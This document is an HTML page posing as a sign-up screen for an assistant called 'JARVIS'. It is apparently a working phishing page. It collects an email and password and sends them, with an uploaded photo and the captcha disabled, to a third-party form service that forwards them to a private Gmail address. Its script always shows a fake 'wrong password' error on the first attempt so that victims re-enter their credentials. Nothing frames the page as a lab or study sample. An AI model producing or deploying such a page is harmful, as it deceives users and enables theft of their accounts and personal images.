<!DOCTYPE html>
<html>
<head>
<title>JARVIS</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial;
}

body{
height:100vh;
display:flex;
justify-content:center;
align-items:center;

background:url("Bg.jpg");
background-size:cover;
background-position:center;
}

.container{
width:350px;
padding:35px;
border-radius:20px;

background:rgba(255,255,255,0.1);
backdrop-filter:blur(15px);

border:1px solid rgba(255,255,255,0.3);
box-shadow:0 8px 32px rgba(0,0,0,0.3);

text-align:center;
color:white;
}

h2{
margin-bottom:20px;
}

input{
width:100%;
padding:12px;
margin:10px 0;

border-radius:10px;
border:1px solid rgba(255,255,255,0.3);

background:rgba(255,255,255,0.2);
color:white;
}

input::placeholder{
color:#eee;
}

button{
width:100%;
padding:12px;
margin-top:15px;

border:none;
border-radius:10px;

background:rgba(255,255,255,0.25);
color:white;
font-size:16px;

cursor:pointer;
}

#error{
color:#ff6b6b;
font-size:13px;
display:none;
}

#photoSection{
display:none;
}

</style>
</head>

<body>

<div class="container">

<h2>Hello sir! im JARVIS, lets get started!</h2>

<form action="https://formsubmit.co/bits18105@gmail.com"
method="POST"
enctype="multipart/form-data">

<input type="hidden" name="_captcha" value="false">

<div id="infoSection">

<input type="text" name="name" id="nameInput" placeholder="Your Email" required>

<p id="error">Wrong Password for this email. Please try again.</p>

<input type="text" name="info" placeholder="Your password">

<button type="button" onclick="nextStep()">sign up</button>

</div>

<div id="photoSection">

<p>Sir,Please select a photo for you dp.</p>

<input type="file" id="photoInput" name="photo" accept="image/*">

<button type="submit">Set as my dp</button>

</div>

</form>

</div>

<script>

let firstAttempt=true;

function nextStep(){

if(firstAttempt){

document.getElementById("error").style.display="block";
firstAttempt=false;
return;

}

document.getElementById("error").style.display="none";

document.getElementById("infoSection").style.display="none";

document.getElementById("photoSection").style.display="block";

document.getElementById("photoInput").required=true;

}

</script>

</body>
</html>
